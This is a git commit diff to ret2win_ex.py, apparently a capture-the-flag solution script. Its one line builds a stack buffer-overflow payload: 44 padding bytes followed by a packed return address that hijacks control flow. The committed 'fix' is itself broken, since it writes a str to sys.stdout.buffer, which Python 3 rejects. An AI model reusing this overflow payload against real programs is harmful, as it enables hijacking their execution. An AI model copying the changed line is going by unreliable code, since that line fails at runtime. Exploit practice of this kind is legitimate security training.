0ea2198e646cfe60d58efc21845eea1a7135451f
Clif Wolfe <34320249+flounderK@users.noreply.github.com>
2019-03-14 17:49:09 -0400

    'fixed' problem caused by python3's encoding

--- ret2win_ex.py
+++ ret2win_ex.py
@@ -1,2 +1,2 @@
-import struct;x=lambda a:struct.pack('I', a).decode('ISO-8859-1');
-print('D'*44 + x(0x08048659) + 'A')
+import sys,struct;x=lambda a:struct.pack('I', a).decode('ISO-8859-1');
+sys.stdout.buffer.write('D'*44 + x(0x08048659) + 'A')
